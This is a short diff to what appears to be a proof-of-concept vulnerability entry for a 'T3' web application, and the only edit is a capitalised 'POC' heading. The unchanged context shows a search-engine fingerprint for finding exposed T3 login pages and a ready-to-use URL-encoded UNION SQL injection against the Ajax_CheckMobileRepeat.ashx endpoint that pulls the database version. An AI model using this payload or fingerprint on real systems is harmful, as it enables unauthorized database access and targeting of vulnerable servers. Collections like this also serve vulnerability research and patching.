@@ -8,7 +8,7 @@
 body="/mlogin.htm?url=" || body="T3/MAIN/Login.aspx"
 ```
 
-## poc
+## POC
 
 ```javascript
 http://ip/T3/Ajax/Ajax_CheckMobileRepeat.ashx?action=checkmobilerepeat&mobileNum=1%27%20UNION%20ALL%20SELECT%20NULL%2C%28SELECT%20%40%40version%29--%20aEdt
